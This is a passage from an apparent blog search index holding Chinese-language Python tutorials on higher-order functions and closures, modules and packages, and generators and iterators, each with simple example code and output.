序列化》《Python之数据序列化（json、pickle、shelve）》《python3之序列化（pickle&amp;json&amp;shelve）》\n","thumbnail":"https://i.loli.net/2019/03/06/5c7f728723843.jpg","plink":"https://Directoree.github.io/post/Python-FileContents/"},{"title":"Python-函数式编程","date":"2019-03-04T10:57:28.000Z","updated":"2019-03-06T07:04:37.689Z","content":"装饰器还没搞懂，搞懂了再来继续写吧~函数既可作为返回值也可作为函数的参数…一切都是对象，一切都是指针，一切都是东西…返回函数（引用）和返回函数值是不一样滴….  ◡̈⃝︎⋆︎*\n\n\n函数式编程 \n\n\n\n\n\n函数式编程的一个特点就是，允许把函数本身作为参数传入另一个函数，还允许返回一个函数！ \n\n\n\n\n一. 高阶函数\n\n\n变量可以指向函数；\n函数名也是变量；\n函数可以作为return的返回值；\n函数可以作为另一个函数的参数。\n\n\n\n1.1 变量指向函数\n&emsp;&emsp; 在讲变量和字符串的时候我们讲过，变量就是一个对象，可以当作一个指针使用，而函数名也是一个变量，也就是一个对象。函数名其实就是指向函数的变量！注意，函数名是一个变量！变量！变量！当作指针用。\n&emsp;&emsp; 既然变量可以指向函数，函数的参数能接收变量，那么一个函数就可以接收另一个函数作为参数，这种函数就称之为高阶函数。\n\n\n\n见过两种函数赋值给变量的形式，这两种形式是有区别的，分别总结一下。一种是a = f另一种是a = f()1. a = f 型属于将变量指向函数。\n\n如下用示例说明：\nprint(abs(-10))\nprint(abs)\n\n输出：\n10\n&lt;built-in function abs>\n------------------------------------------------------------------------------------------  \n可见，abs(-10)是函数调用，而abs是函数本身。\n要获得函数调用结果，我们可以把结果赋值给变量：  \n\nx = abs(-10)\nprint(x)\n\n输出：\n10\n------------------------------------------------------------------------------------------\n但是，如果把函数本身赋值给变量呢？\n\nf = abs\nprint(f)\n\n输出：\n&lt;built-in function abs>\n------------------------------------------------------------------------------------------\n结论：函数本身也可以赋值给变量，即：变量可以指向函数。\n如果一个变量指向了一个函数，那么，可否通过该变量来调用这个函数？用代码验证一下：\n\nf = abs\nprint(f(-10))\n\n输出：\n10\n------------------------------------------------------------------------------------------\n成功！说明变量f现在已经指向了abs函数本身。直接调用abs()函数和调用变量f()完全相同。\n\n\n说明变量f现在已经指向了abs函数本身。直接调用abs()函数和调用变量f()完全相同。这是廖雪峰老师python教程上的例子，现在调用f()和调用abs()是一样的了。\n\n再举一个工厂函数的例子：\ndef maker(N):\n\n　　def action(X):\n\n　　　　return X**N\n\n　　return action\n------------------------------------------------------------------------------------------\n这个嵌套函数的外层返回值为内层函数的函数名，注意没有括号，这里有无括号是有很大区别的。此时调用外部函数：\n\nf=maker(2)   //此时进入maker(2)，且定义了一个action(X)函数，然后返回action函数名（对象）给f\n------------------------------------------------------------------------------------------\n那么如上所述，f便指向了action函数，且限制条件为N=2，可以理解为f为N等于2时的action函数。我们来调用它：\n\nprint(f(3))   //此时相当于调用了cation(3)函数，这也是在外部使用内部嵌套函数的方法，\n              //因为内部嵌套函数是不允许在外部访问的。\n\n输出：\n9            //证明f和action函数是一样的。\n------------------------------------------------------------------------------------------\n如上的示例也可以用print(f=maker(2)(3))来输出结果一样，两个括号连在一起相当于执行了这两个函数。\n\ndef maker(N):\n    def a(c): \n        return c**N \n    return a\n\nf=maker(2)(3)\nprint(f)\n\nOUTPUT: 9\n\n\n2. a = f() 型属于将f()的返回值赋值给a的过程\n\n这里的a仅仅接收f()的返回值，如果f()没有返回值，那么a即被赋值为None。这里值得注意的一点是，\n在a=f()的执行过程中，f()会运行一次，如：\n\ndef add(x,y):\n    z = x+y\n    print(z)\na = add(3,4)\nprint('******我是分隔符，嘿嘿嘿******')\nprint(a)\n\nOUTPUT: \n7\n******我是分隔符，嘿嘿嘿******\nNone\n------------------------------------------------------------------------------------------\n这里在分隔符前输出了7，说明赋值过程函数add执行了，然而a的值为None，且只能通过print语句才可以显示。\n这是因为add()函数没有return语句。\n\n\n\n1.2 传入函数与返回函数名\n一、传入函数（把函数作为参数）\n\n\n\n&emsp;&emsp;既然变量可以指向函数，函数的参数能接收变量，那么一个函数就可以接收另一个函数作为参数，这种函数就称之为高阶函数。\n一个最简单的高阶函数：\ndef add(x, y, f):\n    return f(x) + f(y)\n\n当我们调用add(-5, 6, abs)时，参数x，y和f分别接收-5，6和abs，根据函数定义，我们可以推导计算过程为：\nx = -5\ny = 6\nf = abs\nf(x) + f(y) ==> abs(-5) + abs(6) ==> 11\nreturn 11\n\n用代码验证一下：\ndef add(x, y, f):\n    return f(x) + f(y)\n\nprint(add(-5, 6, abs))\n\nOUTPUT: 11 \n\n\n\n总结：编写高阶函数，就是让函数的参数能够接收别的函数。把函数作为参数传入，这样的函数称为高阶函数，函数式编程就是指这种高度抽象的编程范式。\n\n\n二、返回函数名（把函数名作为返回值）\n\n&emsp;&emsp;高阶函数除了可以接受函数作为参数外，还可以把函数名作为结果值返回。注意Python3返回的是迭代器对象。\n\n'''我们来实现一个可变参数的求和。通常情况下，求和的函数是这样定义的：'''\n\ndef calc_sum(*args):   '在函数的参数章节讲过，*传入元组，**传入字典'\n    ax = 0\n    for n in args:\n        ax = ax + n\n    return ax\n'''但是，如果不需要立刻求和，而是在后面的代码中，根据需要再计算怎么办？可以不返回求和的结果，\n而是返回求和的函数：'''\n\ndef lazy_sum(*args):\n    def sum():\n        ax = 0\n        for n in args:\n            ax = ax + n\n        return ax\n    return sum\n\n'''当我们调用lazy_sum()时，返回的并不是求和结果，而是求和函数：'''\n\nf = lazy_sum(1, 3, 5, 7, 9)\nprint(f)\nOUTPUT: &lt;function lazy_sum.&lt;locals>.sum at 0x101c6ed90>\n\n'''调用函数f时，才真正计算求和的结果：'''\n\nf()\nOUTPUT: 25\n\n'''\n在这个例子中，我们在函数lazy_sum中又定义了函数sum，并且，内部函数sum可以引用外部函数lazy_sum\n的参数和局部变量，当lazy_sum返回函数sum时，相关参数和变量都保存在返回的函数中，这种称为\n“闭包（Closure）”的程序结构拥有极大的威力。\n\n请再注意一点，当我们调用lazy_sum()时，每次调用都会返回一个新的函数，即使传入相同的参数：\n'''\n\nf1 = lazy_sum(1, 3, 5, 7, 9)\nf2 = lazy_sum(1, 3, 5, 7, 9)\nf1==f2\nOUTPUT: False\n'f1()和f2()的调用结果互不影响。'\n\n\n三、闭包\n\n&emsp;&emsp;注意到返回的函数在其定义内部引用了局部变量args，所以，当一个函数返回了一个函数后，其内部的局部变量还被新函数引用，所以，闭包用起来简单，实现起来可不容易。\n'''另一个需要注意的问题是，返回的函数并没有立刻执行，而是直到调用了f()才执行。\n    我们来看一个例子：'''\n\ndef count():\n    fs = []\n    for i in range(1, 4):\n        def f():\n             return i*i\n        fs.append(f)\n    return fs\n\nf1, f2, f3 = count()\n\n'''在上面的例子中，每次循环，都创建了一个新的函数，然后，把创建的3个函数都返回了。\n你可能认为调用f1()，f2()和f3()结果应该是1，4，9，但实际结果是：'''\n\n>>> f1()\n9\n>>> f2()\n9\n>>> f3()\n9\n\n'''\n全部都是9！原因就在于返回的函数引用了变量i，但它并非立刻执行。等到3个函数都返回时，它们所引用的变\n量i已经变成了3，因此最终结果为9。\n\n返回闭包时牢记一点：返回函数不要引用任何循环变量，或者后续会发生变化的变量。\n如果一定要引用循环变量怎么办？方法是再创建一个函数，用该函数的参数绑定循环变量当前的值，无论该\n循环变量后续如何更改，已绑定到函数参数的值不变：\n'''\n\ndef count():\n    def f(j):\n        def g():\n            return j*j\n        return g\n    fs = []\n    for i in range(1, 4):\n        fs.append(f(i)) # f(i)立刻被执行，因此i的当前值被传入f()\n    return fs\n\n'再看看结果：'\n\n>>> f1, f2, f3 = count()\n>>> f1()\n1\n>>> f2()\n4\n>>> f3()\n9\n'''缺点是代码较长，可利用lambda函数缩短代码。'''\n\n\n\n二. 装饰器","thumbnail":"https://s2.ax1x.com/2019/03/04/kOxQJS.jpg","plink":"https://Directoree.github.io/post/Python-FunctionalProgramming/"},{"title":"Python-模块和包","date":"2019-03-03T10:28:06.000Z","updated":"2019-03-05T17:28:51.745Z","content":"from…import…😀\n\n\n模块和包 \n\n\n\n一. 模块与包的意义\n1.1 什么是模块？\n在Python中，一个.py文件就称之为一个模块（Module）。\n\n\n1.2 为什么要使用模块？\n为了编写可维护的代码，我们把很多函数分组，分别放到不同的文件里，这样，每个文件包含的代码就相对较少，很多编程语言都采用这种组织代码的方式。\n\n\n\n\n\n随着程序的发展，功能越来越多，为了方便管理，我们通常将程序分成一个个的文件，这样做程序的结构更清晰，方便管理。这时我们不仅仅可以把这些文件当做脚本去执行，还可以把他们当做模块来导入到其他的模块中，实现了功能的重复利用。\n\n\n\n\n\n我们在编写程序的时候，也经常引用其他模块，包括Python内置的模块和来自第三方的模块。\n\n\n\n\n\n使用模块还可以避免函数名和变量名冲突。相同名字的函数和变量完全可以分别存在不同的模块中，因此，我们自己在编写模块时，不必考虑名字会与其他模块冲突。但是也要注意，尽量不要与内置函数名字冲突。\n\n\n\n\n\n\n1.3 什么是包？\n如果不同的人编写的模块名相同怎么办？为了避免模块名冲突，Python又引入了按目录（文件夹）来组织模块的方法，称为包（Package）。\n\n\n\n\n\n包是目录级的（文件夹级），文件夹是用来组成py文件（包的本质就是一个包含__init__.py文件的目录）\n\n\n\n\n\n每一个包目录下面都会有一个 __init__.py 的文件，这个文件是必须存在的，否则，Python就把这个目录当成普通目录，而不是一个包。它可以是空文件，也可以有Python代码，因为 __init__.py 本身就是一个模块。\n\n\n\n\n\nimport导入文件时，产生名称空间中的名字来源于文件，import 包，产生的名称空间的名字同样来源于文件，即包下的 __init__.py ，导入包本质就是在导入该文件。\n\n\n\n\n\n文件夹里面还可以包含文件夹（可以有多级目录，组成多级层次的包结构）。但是每一个文件夹下面必须有一个 __init__.py 文件。\n\n\n\n\n\n自己创建模块时要注意命名，不能和Python自带的模块名称冲突。例如，系统自带了sys模块，自己的模块就不可命名为sys.py，否则将无法导入系统自带的sys模块。\n\n\n\n\n\n举例说明：\n\n有个包按照如下目录存放文件：\nmycompany├─ __init__.py├─ abc.py└─ xyz.py\n\n引入了包以后，只要顶层的包名不与别人冲突，那所有模块都不会与别人冲突。现在，abc.py 模块的名字就变成了 mycompany.abc ，类似的，xyz.py 的模块名变成了 mycompany.xyz 。\n\n\n类似的，可以有多级目录，组成多级层次的包结构。比如如下的目录结构：\nmycompany ├─ web │  ├─ __init__.py │  ├─ utils.py │  └─ www.py ├─ __init__.py ├─ abc.py └─ xyz.py\n\n文件www.py 的模块名就是mycompany.web.www，两个文件utils.py的模块名分别是mycompany.utils和 mycompany.web.utils\n\n\n总结\n\n\n模块是一组Python代码的集合，可以使用其他模块，也可以被其他模块使用。\n\n\n创建自己的模块时，要注意：1.  模块名要遵循Python变量命名规范，不要使用中文、特殊字符；2. 模块名不要和系统模块名冲突，最好先查看系统是否已存在该模块，检查方法是在Python交互环境执行import abc，若成功则说明系统存在此模块。\n\n\n\n二. 使用模块 -- 无包组织\n\n使用模块的几种语句：1. import 语句： import module1[, module2[,... moduleN]2. from … import 语句： from  modname import  name1[, name2[, ... nameN]] 3. from … import * 语句： from  modname import *4. __name__属性： 用来分清该模块是调用者还是被其他模块调用。5. dir() 函数： 用来查找模块中定义的名字，返回一个有序字符串列表。\n\n\n2.1 import 语句想使用 Python 源文件，只需在另一个源文件里执行 import 语句，语法如下：\n\nimport module1[, module2[,... moduleN]\n\n\n使用 Python 源文件，只需在另一个源文件里执行 import 语句。\n\n一个模块只会被导入一次，不管你执行了多少次import。这样可以防止导入模块被一遍又一遍地执行。\n\n调用者引用模块后可以：模块名.函数名(参数)来使用。\n\n\n\n\n\n举例说明：当解释器遇到 import 语句，如果模块在当前的搜索路径就会被导入。如想要导入模块 support，需要把命令放在脚本的顶端：\nsupport.py 文件代码\n\ndef print_func( par ):\n    print (\"Hello : \", par)\n    return\n\n------------------------------------------------------------------------------------------\n------------------------------------------------------------------------------------------\ntest.py 文件代码\n# 导入模块\nimport support\n\n# 现在可以调用模块里包含的函数了\nsupport.print_func(\"Runoob\")\n------------------------------------------------------------------------------------------\n运行test.py实例输出结果：\nHello :  Runoob\n\n\n2.2 from … import 语句Python 的 from 语句让你从模块中导入一个指定的部分到当前命名空间中，这种访问函数时可以直接使用函数名而不需要前缀，语法如下：\n\nfrom modname import name1[, name2[, ... nameN]]\n\n\n举例说明：例如，要导入模块 fibo 的 fib 函数，使用如下语句：\nfibo.py\n# 斐波那契(fibonacci)数列模块\n\ndef fib(n):    # 定义到 n 的斐波那契数列\n    a, b = 0, 1\n    while b &lt; n:\n        print(b, end=' ')\n        a, b = b, a+b\n    print()   //输出为None\n\ndef fib2(n): # 返回到 n 的斐波那契数列\n    result = []\n    a, b = 0, 1\n    while b &lt; n:\n        result.append(b)\n        a, b = b, a+b\n    return result\n------------------------------------------------------------------------------------------\n------------------------------------------------------------------------------------------\ntest.py\nfrom fibo import fib, fib2\nprint(fib(500))\nprint(fib2(500))\n\n运行结果：\n1 1 2 3 5 8 13 21 34 55 89 144 233 377\nNone\n[1, 1, 2, 3, 5, 8, 13, 21, 34, 55, 89, 144, 233, 377]\n\n\n2.3 from … import * 语句\n这提供了一个简单的方法来导入一个模块中的所有项目。然而这种声明不该被过多地使用。\n\n这种方法，可以一次性的把模块中的所有（函数，变量）名称都导入到当前模块的字符表。\n\n这将把所有的名字都导入进来，但是那些由单一下划线（_）开头的名字不在此例。大多数情况， Python程序员不使用这种方法，因为引入的其它来源的命名，很可能覆盖了已有的定义。\n\n\n\n\n\n把一个模块的所有内容全都导入到当前的命名空间也是可行的，只需使用如下声明：\nfrom modname import *\n\n\n\n三. 使用模块 -- 有包组织\n目录只有包含一个叫做 __init__.py 的文件才会被认作是一个包，主要是为了避免一些滥俗的名字（比如叫做 string）不小心的影响搜索路径中的有效模块。\n\n最简单的情况，放一个空的 __init__.py就可以了。当然这个文件中也可以包含一些初始化代码或者为（将在后面介绍的） __all__变量赋值。\n\n\n\n\n\n1. import 语句：\n\n用户可以每次只导入一个包里面的特定模块，他必须使用全名去访问:\nimport 包名.子包名.模块名                 导入模块\n\n包名.子包名.模块名 .函数名(参数)           使用模块\n\n\n2. import …from 语句：    \n\n同样会导入子模块，他不需要那些冗长的前缀，只需要模块名.函数名(参数)即可，推荐使用！\nfrom 包名.子包名 import 模块名           导入模块\n\n模块名.函数名(参数)                      使用模块\n\n\n3. import …from 语句：\n\n还有一种变化就是直接导入一个函数或者变量:\nfrom 包名.子包名.模块名  import 函数名      导入模块\n函数名(参数)                               使用模块\n\n\n\n4. import …from * 语句：\n\n\n注意：这种导入方法必须要注意__init__.py里面的属性__all__已经设置好。__all__是用于控制from…import *\n\nPython 会进入文件系统，找到这个包里面所有的子模块，一个一个的把它们都导入进来。但是很不幸，这个方法在 Windows平台上工作的就不是非常好，因为Windows是一个大小写不区分的系统。\n\n在这类平台上，没有人敢担保一个叫做 ECHO.py 的文件导入为模块 echo 还是 Echo 甚至 ECHO。\n\nfrom 包名.子包名 import *                 导入所有模块\n模块名.函数名(参数)                        使用模块\n\n具体使用方法请看下面章节四。\n\n\n总结使用时注意事项：\n\n注意当使用from package import item这种形式的时候，对应的item既可以是包里面的子模块（子包），或者包里面定义的其他名称，比如函数，类或者变量。\nimport语法会首先把item当作一个包定义的名称，如果没找到，再试图按照一个模块去导入。如果还没找到，恭喜，一个:exc:ImportError 异常被抛出了。\n反之，如果使用形如import item.subitem.subsubitem这种导入形式，最后一项可以是包或者模块（不可以是类，函数或者变量的名字），除了最后一项，都必须是包。。\n\n\n\n\n四. __init__、__all__、__name__、__author__、__doc__、dir()函数\n4.1 __init__、__all__在使用from 包名.子包名 import \\* 语句时必须修改__init__.py文件的__all__    列表变量。\n\n\n\n如果包定义文件 __init__.py 存在一个叫做 __all__     的列表变量，那么在使用 from package import *的时候就把这个列表中的所有名字作为包内容导入。\n作为包的作者，可别忘了在更新包之后保证 __all__     也更新了啊。你说我就不这么做，我就不使用导入*这种用法，好吧，没问题。这里有一个例子\n这表示当你使用from sound.effects import *这种用法时，你只会导入如下包里面这三个子模块。即这种语法导入的是__all__指定的模块。\n在python3中，即使包下没有__init__.py文件，import 包仍然不会报错，而在python2中，包下一定要有该文件，否则import 包报错\nimport导入文件时，产生名称空间中的名字来源于文件，import 包，产生的名称空间的名字同样来源于文件，即包下的__init__.py，导入包本质就是在导入该文件。\n\n\n\n上述的例子：\n__all__ = [\"echo\", \"surround\", \"reverse\"]\n\n\n4.1 __name__、__main__\n__name__是一个变量。前后加了爽下划线是因为是因为这是系统定义的名字。普通变量不要使用此方式命名变量。\n\n__name__就是标识模块的名字的一个系统变量。这里分两种情况：\n\n假如当前模块是主模块（也就是调用其他模块的模块），那么此模块名字就是main，即__name__==__main__。可以执行后面的内容；\n假如此模块是被import的，其值为被调用模块所属的路径。\n\n\n\n\n下面举一个例子：\ntest1.py\n\nif __name__ == '__main__':\n   print('程序自身在运行')\nelse:\n   print('我来自另一模块')\n\n------------------------------------------------------------------------------------------\ntest2.py\nimport test1\n------------------------------------------------------------------------------------------\n\n运行test2.py输出结果：\n我来自另一模块\n\n运行test1.py输出结果：\n程序自身在运行\n\n\n4.3 __author__、__doc__文档注释：任何模块代码的第一个字符串都被视为模块的文档注释；\n\n__doc__：可以访问一个文件中的第一个单引号（1、2、3对）、双引号（1、2、3对）注释的文档。\n\n__author__：可以将一个文件的作者名字赋给它。\n\n\n应用示例如下：\n\n\n# -*- coding: utf-8 -*-\n\n' a test module ' \n'fgbhjknml'\n\n__author__ = 'Directoree'\n\na = 10\n\nprint(a)\nprint(__doc__)\nprint(__doc__)\nprint(__author__)\n\n运行结果：\n10\n a test module\n a test module\nDirectoree\n\n\n4.4 dir()函数\n内置的函数 dir() 可以找到模块内定义的所有名称。以一个字符串列表的形式返回 。无参数： 只能列举当前模块已经被定义的名字；有参数： 参数只能是已经引用的模块名字，不能为自身名字，否则会报错。\n\n\n举例子说明：\ntest3.py\n# -*- coding: utf-8 -*-\n\n' a test module ' \n'fgbhjknml'\n__author__ = 'Directoree'\na = 10\n\nprint(__doc__)\nprint(__author__)\nprint(dir())\n\n运行结果：\n a test module\nDirectoree\n['__annotations__', '__author__', '__builtins__', '__cached__', '__doc__', \n'__file__', '__loader__', '__name__', '__package__', '__spec__', 'a', 'bbb']\n\n------------------------------------------------------------------------------------------\n------------------------------------------------------------------------------------------\ntest3.py\n# -*- coding: utf-8 -*-\nimport test3  \nprint(dir(test3))\n\n运行结果：\n['__author__', '__builtins__', '__cached__', '__doc__', '__file__', '__loader__', \n'__name__', '__package__', '__spec__', 'a', 'bbb']\n['__author__', '__builtins__', '__cached__', '__doc__', '__file__', '__loader__', \n'__name__', '__package__', '__spec__', 'a', 'bbb']\n\n\n\n五. 非公开函数\n外部不需要引用的函数全部定义成private，只有外部需要引用的函数才定义为public。\n\n类似_xxx和__xxx这样的函数或变量就是非公开的（private），不应该被直接引用，比如_abc，__abc等；\n\n之所以我们说，private函数和变量“不应该”被直接引用，而不是“不能”被直接引用，是因为Python并没有一种方法可以完全限制访问private函数或变量，但是，从编程习惯上不应该引用private函数或变量。\n\nprivate函数或变量不应该被别人引用，那它们有什么用呢？请看例子：\ndef _private_1(name):\n    return 'Hello, %s' % name\n\ndef _private_2(name):\n    return 'Hi, %s' % name\n\ndef greeting(name):\n    if len(name) > 3:\n        return _private_1(name)\n    else:\n        return _private_2(name)\n\n\n我们在模块里公开greeting()函数，而把内部逻辑用private函数隐藏起来了，这样，调用greeting()函数不用关心内部的private函数细节，这也是一种非常有用的代码封装和抽象的方法，即：\n\n\n外部不需要引用的函数全部定义成private，只有外部需要引用的函数才定义为public。\n\n\n\n","thumbnail":"https://i.loli.net/2019/03/03/5c7b72e96a73f.jpg","plink":"https://Directoree.github.io/post/Python-Modules-Packages/"},{"title":"Python-生成器与迭代器","date":"2019-03-03T02:33:30.000Z","updated":"2019-03-04T10:01:27.677Z","content":"生成器生成想要的数据，可控制循环暂停，迭代器把可迭代的对象转换为生成器。( ⸝⸝⸝•_•⸝⸝⸝ )♡︎♡︎\n\n\n\n生成器与迭代器 \n\n\n\n一. 迭代、列表生成式1.1 迭代迭代：如果给定一个list或tuple，我们可以通过for循环来遍历这个list或tuple，这种遍历我们称为迭代（Iteration）。Python的for…in循环就是迭代。list这种数据类型虽然有下标，但很多其他数据类型是没有下标的，但是，只要是可迭代对象，无论有无下标，都可以迭代，比如dict就可以迭代：\n\nd = {'a': 1, 'b': 2, 'c': 3}\nfor key in d:\n    print(key)\n\n运行结果：\na\nb\nc\n\n\n\n\n因为dict、set的存储不是按照list的方式顺序排列，所以，迭代出的结果顺序很可能不一样。\n默认情况下，dict迭代的是key。如果要迭代value，可以用for value in d.values()，如果要同时迭代key和value，可以用for k, v in d.items()。\n当我们使用for循环时，只要作用于一个可迭代对象，for循环就可以正常运行，而我们不太关心该对象究竟是list还是其他数据类型。\n\n\n最后一个小问题，如果要对list实现类似Java那样的下标循环怎么办？Python内置的enumerate函数可以把一个list变成索引-元素对，这样就可以在for循环中同时迭代索引和元素本身：\nfor i, value in enumerate(['A', 'B', 'C']):\n     print(i, value)\n\n运行结果：\n0 A\n1 B\n2 C\n\n\n\n1.2 列表生成式规则：for前面是一个表达式，表示将in后面的元素按照这个表达式进行计算出来后还要看in后面有没有筛选条件，然后赋值给for…in中间的变量。格式如下：\n表达式1 for 变量 in 可迭代对象 [表达式2]\n\n\n列表生成式即List Comprehensions，是Python内置的非常简单却强大的可以用来创建list的生成式。\n举个例子，要生成list [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]可以用list(range(1, 11))：\nfor a in range(1,11):\n    print(a)\n\nb = list(range(1,11))    \nprint(b)\n\n\n运行结果：\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n[1, 2, 3, 4, 5, 6, 7, 8, 9, 10]\n\n\n但如果要生成[1x1, 2x2, 3x3, …, 10x10]怎么做？方法一是循环：\nL = []\nfor x in range(1, 11):\n    L.append(x * x)\nprint(L)\n\n运行结果：\n[1, 4, 9, 16, 25, 36, 49, 64, 81, 100]\n\n\n但是循环太繁琐，而列表生成式则可以用一行语句代替循环生成上面的list：\na = [x * x for x in range(1, 11)]\nprint(a)\n\n运行结果：\n[1, 4, 9, 16, 25, 36, 49, 64, 81, 100]\n\n\nfor前面是一个表达式，表示将in后面的元素按照这个表达式进行计算出来后还要看in后面有没有筛选条件，\n然后赋值给for...in中间的变量。格式如下：\n\n表达式1 for 变量 in 可迭代对象 [表达式2]\n\n------------------------------------------------------------------------------------------\n------------------------------------------------------------------------------------------\n\n1. for循环后面还可以加上if判断，这样我们就可以筛选出仅偶数的平方：\n\na = [x * x for x in range(1, 11) if x % 2 == 0]\nprint(a)\n\n运行结果：\n[4, 16, 36, 64, 100]\n\n------------------------------------------------------------------------------------------\n------------------------------------------------------------------------------------------\n\n2. 还可以使用两层循环，可以生成全排列：\n\nb = [m + n for m in 'ABC' for n in 'XYZ']\nprint(b)\n\n运行结果：\n['AX', 'AY', 'AZ', 'BX', 'BY', 'BZ', 'CX', 'CY', 'CZ']\n\n------------------------------------------------------------------------------------------\n------------------------------------------------------------------------------------------\n\n3. for循环其实可以同时使用两个甚至多个变量，比如dict的items()可以同时迭代key和value：\n\nd = {'x': 'A', 'y': 'B', 'z': 'C' }\na = [k + '=' + v for k, v in d.items()]\nprint(a)\n\n运行结果：\n['x=A', 'y=B', 'z=C']\n\n\n\n二. 生成器参考资料：\n《python 生成器和迭代器有这篇就够了》《Python3 迭代器与生成器》《Python yield 使用浅析》\n\n\n\n什么是生成器？\n\n　　通过列表生成式，我们可以直接创建一个列表，但是，受到内存限制，列表容量肯定是有限的，而且创建一个包含100万个元素的列表，不仅占用很大的存储空间，如果我们仅仅需要访问前面几个元素，那后面绝大多数元素占用的空间都白白浪费了。\n　　所以，如果列表元素可以按照某种算法推算出来，那我们是否可以在循环的过程中不断推算出后续的元素呢？这样就不必创建完整的list，从而节省大量的空间，在Python中，这种一边循环一边计算的机制，称为生成器：generator\n　　生成器是一个特殊的程序，可以被用作控制循环的迭代行为，python中生成器是迭代器的一种，使用yield返回值函数，每次调用yield会暂停，而可以使用next()函数和send()函数恢复生成器。\n　　生成器类似于返回值为数组的一个函数，这个函数可以接受参数，可以被调用，但是，不同于一般的函数会一次性返回包括了所有数值的数组，生成器一次只能产生一个值，这样消耗的内存数量将大大减小，而且允许调用函数可以很快的处理前几个返回值，因此生成器看起来像是一个函数，但是表现得却像是迭代器\n\n\npython提供了两种生成器基本的方式\n生成器函数：也是用def定义的，利用关键字yield一次返回一个结果、阻塞，重新开始\n生成器表达式：返回一个对象，这个对象只有在需要的时候才产生结果\n\n\n\n2.1 yield、__next__()、send()\n\n带有yield语句的函数不再是一个普通的函数，而是一个生成器generator，可用于迭代。\n\nyield是一个类似return 的关键字，返回一个值或者表达式，迭代一次遇到yield的时候就返回yield后面（代码块）或者右面（单行）的值，然后暂停。\n\n一个函数正常执行遇到yeild时，yeild返回一个值给函数的调用者，然后在这暂停并记住这个位置（因为此时程序要跳转到调用这个函数的地方 =&gt; 因为yeild的返回）！不去执行下一个语句的代码。当程序执行遇到__next__()方法或者next()（Python2用）时，继续执行上次yield的下一个语句直到遇到下一个yield或者该函数结束。\n\nsend()和next()的区别就在于send可传递参数给yield表达式，这时候传递的参数就会作为yield表达式的值，而yield的参数是返回给调用者的值，也就是说send可以强行修改上一个yield表达式值。\n\nsend()和next()都有返回值，他们的返回值是当前迭代遇到的yield的时候，yield后面表达式的值，其实就是当前迭代yield后面的参数。\n\nfor…in 循环中会自动调用 next()。这就说明for…in能够不中断地执行完整个函数。\n\n\n\n下面举例子说明：\n下面的例子用 a.__next__() 和 print(next(a)) 来说明yeild的返回和暂停\n\n------------------------------------------------------------------------------------------\n------------------------------------------------------------------------------------------\n例1：\n\ndef odd():\n    print('step 1')\n    yield 1\n    print('step 2')\n    yield 3\n    print('step 3')\n    yield 5\n\na = odd()\nb = a.__next__()  \nprint('*****分割线*****')  \nprint(b) \n\nprint('\\n')\n\nc = a.__next__() \nprint('*****分割线*****')  \nprint(c) \n\n\n输出：       \nstep 1\n*****分割线*****\n1\n\n\nstep 2\n*****分割线*****\n3\n\n结论：这个时候在yield 1处暂停了（输出step1），并且yield返回了一个值1给a.__next__() 。\n\n\n\n2.2 表达式创建生成器\ngenerator保存的是算法，每次调用next(generaotr_ex)就计算出他的下一个元素的值，直到计算出最后一个元素，没有更多的元素时，抛出StopIteration的错误。\n\n要创建一个generator，有很多种方法，第一种方法很简单，只有把一个列表生成式的[]中括号改为（）小括号，就创建一个generator:\n#列表生成式\nlis = [x*x for x in range(10)]\nprint(lis)\n#生成器\ngenerator_ex = (x*x for x in range(10))\nprint(generator_ex)\n\n结果：\n[0, 1, 4, 9, 16, 25, 36, 49, 64, 81]\n&lt;generator object &lt;genexpr> at 0x000002A4CBF9EBA0>\n\n\n　　那么创建lis和generator_ex，的区别是什么呢？从表面看就是[  ]和（）,但是结果却不一样，一个打印出来是列表（因为是列表生成式），而第二个打印出来却是&lt;generator object  at 0x000002A4CBF9EBA0&gt;，那么如何打印出来generator_ex的每一个元素呢？\n　　如果要一个个打印出来，可以通过 __next__() 获得generator的下一个返回值：\n#生成器\ngenerator_ex = (x*x for x in range(10))\nprint(generator_ex.__next__())\nprint(generator_ex.__next__())\nprint(generator_ex.__next__())\nprint(generator_ex.__next__())\nprint(generator_ex.__next__())\nprint(generator_ex.__next__())\nprint(generator_ex.__next__())\nprint(generator_ex.__next__())\nprint(generator_ex.__next__())\nprint(generator_ex.__next__())\nprint(generator_ex.__next__())\n\n结果：\n0\n1\n4\n9\n16\n25\n36\n49\n64\n81\nTraceback (most recent call last):\n  File \"列表生成式.py\", line 42, in &lt;module>\n    print(next(generator_ex))\nStopIteration\n\n\ngenerator保存的是算法，每次调用next(generaotr_ex)就计算出他的下一个元素的值，直到计算出最后一个元素，没有更多的元素时，抛出StopIteration的错误，而且上面这样不断调用是一个不好的习惯，正确的方法是使用for循环，因为generator也是可迭代对象。\n所以我们创建一个generator后，基本上永远不会调用__next__()，而是通过for循环来迭代，并且不需要关心StopIteration的错误，generator非常强大，如果推算的算法比较复杂，用类似列表生成式的for循环无法实现的时候，还可以用函数来实现。\n#生成器\ngenerator_ex = (x*x for x in range(10))\nfor i in generator_ex:\n    print(i)\n\n结果：\n0\n1\n4\n9\n16\n25\n36\n49\n64\n81\n\n\n\n2.2 函数创建生成器\n如果一个函数定义中包含yield关键字，那么这个函数就不再是一个普通函数，而是一个生成器。\n\n\n下面举例子说明：\n著名的斐波那契数列，除第一个和第二个数外，任何一个数都可以由前两个相加得到：\n1，1，2，3，5，8，13，21，34…..\n斐波那契数列用列表生成式写不出来，但是，用函数把它打印出来却很容易：\n#fibonacci数列\ndef fib(max):\n    n,a,b =0,0,1\n    while n &lt; max:\n        a,b =b,a+b\n        n = n+1\n        print(a)\n    return 'done'\n\na = fib(6)\nprint(fib(6))\n\n运行结果：\n1\n1\n2\n3\n5\n8\n1\n1\n2\n3\n5\n8\ndone\n\n\na,b = b ,a+b  其实相当于 t =a+b ,a =b ,b =t  ，所以不必写显示写出临时变量t，就可以输出斐波那契数列的前N个数字。\n\n\n上面我们发现，print(b)每次函数运行都要打印，占内存，所以为了不占内存，我们也可以使用生成器，同样是使用函数，只不过函数中有 yield 语句，所以叫做生成器。但是返回的不再是一个值，而是一个生成器，和上面的例子一样。\n那么这样就不占内存了，这里说一下generator和函数的执行流程，函数是顺序执行的，遇到return语句或者最后一行函数语句就返回。而变成generator的函数，在每次调用__next__()方法的时候执行，遇到yield语句返回，再次被__next__() 调用时候从上次的返回yield语句处继续执行，也就是用多少，取多少，不占内存。如下：\ndef fib(max):\n    n,a,b =0,0,1\n    while n &lt; max:\n        yield b\n        a,b =b,a+b\n        n = n+1\n    return 